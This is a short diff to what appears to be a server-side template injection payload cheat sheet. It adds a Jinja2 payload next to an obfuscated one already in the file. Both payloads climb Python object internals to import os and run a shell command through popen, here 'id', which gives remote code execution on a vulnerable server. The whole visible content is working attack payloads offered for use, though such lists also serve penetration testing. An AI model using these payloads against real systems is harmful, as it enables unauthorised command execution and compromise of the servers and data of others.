@@ -287,6 +287,7 @@ ${{1+1}}
 ### Python (Jinja2)
 ```
 {{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('id')|attr('read')()}}
+{{request.__class__._load_form_data.__globals__.__builtins__.__import__("os").popen("id").read()}}
 ```
 
 ### Golang
